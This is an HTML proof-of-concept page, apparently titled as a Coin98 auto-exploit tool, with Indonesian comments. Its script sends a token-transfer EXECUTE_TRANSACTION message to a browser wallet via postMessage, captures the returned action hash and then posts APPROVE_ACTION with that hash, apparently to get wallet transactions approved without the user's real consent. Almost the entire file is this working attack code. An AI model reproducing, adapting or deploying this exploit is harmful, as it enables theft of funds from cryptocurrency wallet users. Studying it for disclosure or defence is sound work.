<!DOCTYPE html>
<html>
<head>
    <title>Exploit PoC: Auto-Logger</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: sans-serif; padding: 10px; }
        .log-box { background: #333; color: #0f0; padding: 10px; font-size: 12px; height: 150px; overflow-y: scroll; margin-top: 10px; }
    </style>
</head>
<body>
    <h3>Coin98 Auto-Exploit Tool</h3>
    
    <button id="btnExecute">1. EXECUTE_TRANSACTION</button>
    <div class="log-box" id="logger">Logs will appear here...</div>

    <div style="margin-top:20px;">
        <input type="text" id="hashInput" placeholder="Auto-pasted hash" style="width: 100%;">
        <button id="btnApprove" style="background: red; color: white;">2. APPROVE & EXECUTE</button>
    </div>

    <script>
        const logger = document.getElementById('logger');
        const hashInput = document.getElementById('hashInput');

        // Fungsi log ke layar HP
        const log = (msg) => logger.innerText += "\n" + msg;

        // Mendengarkan pesan balik (respons) dari dompet
        window.addEventListener("message", (event) => {
            if (event.data && event.data.type === "EXECUTE_TRANSACTION_RES") {
                const hash = event.data.data.actionHash;
                log("DITEMUKAN HASH: " + hash);
                hashInput.value = hash; // Otomatis mengisi kolom hash!
            }
        });

        document.getElementById('btnExecute').onclick = () => {
            log("Mengirim EXECUTE...");
            window.postMessage({
                type: "EXECUTE_TRANSACTION",
                data: {
                    transactions: { contractAddress: "0x...", entrypoint: "transfer", calldata: ["0x...", "1000", "0"] }
                }
            }, "*");
        };

        document.getElementById('btnApprove').onclick = () => {
            log("Mengirim APPROVE...");
            window.postMessage({
                type: "APPROVE_ACTION",
                data: { actionHash: hashInput.value }
            }, "*");
        };
    </script>
</body>
</html>
